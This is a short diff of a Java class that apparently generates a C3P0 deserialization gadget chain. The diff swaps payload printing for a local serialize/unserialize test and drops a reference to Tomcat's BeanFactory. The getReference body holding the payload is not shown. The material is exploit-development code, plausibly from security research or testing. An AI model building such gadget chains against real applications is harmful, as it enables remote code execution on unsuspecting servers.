@@ -26,24 +26,17 @@ public class C3P0Tomcat {
         C3P0Tomcat c3P0 = new C3P0Tomcat();
         Object object = c3P0.getObject();
 
-        System.out.println(Base64.getEncoder().encodeToString(SerializerUtils.serialize(object)));
+//        System.out.println(Base64.getEncoder().encodeToString(SerializerUtils.serialize(object)));
 
+        SerializerUtils.unserialize(SerializerUtils.serialize(object));
 //        unserialize();
     }
     public Object getObject () throws Exception {
         PoolBackedDataSource b=new PoolBackedDataSource();
-        ReflectionUtils.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource("org.apache.naming.factory.BeanFactory", null));
+        ReflectionUtils.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource());
         return b;
     }
     private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
-
-        private String className;
-        private String url;
-
-        public PoolSource ( String className, String url ) {
-            this.className = className;
-            this.url = url;
-        }
 
         @Override
         public Reference getReference() {
